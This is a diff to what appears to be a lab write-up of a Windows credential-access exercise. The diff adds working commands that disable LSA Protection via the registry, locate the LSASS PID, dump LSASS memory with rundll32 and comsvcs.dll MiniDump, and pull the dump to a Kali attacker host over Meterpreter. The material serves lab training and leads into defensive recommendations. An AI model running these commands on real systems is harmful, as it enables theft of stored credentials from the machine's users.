@@ -82,17 +82,34 @@ This confirmed the block was not `kiwi`-specific, but a deeper OS-level protecti
 
 ### Attempt 3 (Successful) — Offline LSASS Memory Dump + Parsing
 
-Rather than continuing to fight in-memory extraction against VBS-backed protections, LSASS memory was dumped to disk using native Windows tooling and parsed offline:
+Rather than continuing to fight in-memory extraction against VBS-backed protections, the SYSTEM-level connection was used to create a dump of the LSASS process on the Windows 11 workstation. In this lab, LSA Protection had intentionally been disabled as part of the vulnerable environment configuration:
+
+```powershell
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
+```
+
+This command sets `RunAsPPL` to `0`, disabling LSA Protection after the required reboot. It removes the PPL protection layer for the lab; it does not, by itself, disable Credential Guard or other Virtualization-Based Security features. The previously established SYSTEM-level Meterpreter session then provided the authority required to inspect and dump the protected LSASS process.
+
+First, the process ID (PID) of `lsass.exe` was identified. The PID is assigned dynamically by Windows, so it must be checked on the target rather than assumed:
+
+```cmd
+tasklist /fi "imagename eq lsass.exe"
+```
+
+The command returned the LSASS process and its PID (`808` in this lab). That PID was supplied to the Windows `rundll32.exe` utility, which invoked the `MiniDump` export in the signed `comsvcs.dll` library. The `full` argument requested a full-memory dump, written to `C:\Windows\Tasks\lsass.dmp`:
 
 ```
-[Native Windows dump of the LSASS process to a .dmp file, e.g. via Task Manager
- "Create dump file" on lsass.exe, run with administrative/SYSTEM privileges]
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 808 C:\Windows\Tasks\lsass.dmp full
 ```
+
+This is an offline collection step: it does not extract credentials directly. It creates a file containing LSASS memory, which was then transferred to Kali for parsing.
 
 The resulting dump file was exfiltrated to the Kali attacker platform via the existing Meterpreter session:
 
+[`evidence/lsass-dumping.png`](../evidence/lsass-dumping.png)
+
 ```
-meterpreter > download C:\\Windows\\Temp\\lsass.dmp /root/lsass.dmp
+meterpreter > download C:\\Windows\\Tasks\\lsass.dmp /root/lsass.dmp
 ```
 
 On Kali, the dump was parsed offline using `pypykatz`:
@@ -118,7 +135,6 @@ This confirms that a single interactive logon by a highly privileged account on 
 ## Evidence
 
 [`evidence/credential-access.png`](../evidence/credential-access.png)
-
 
 ## Defensive Recommendations
 
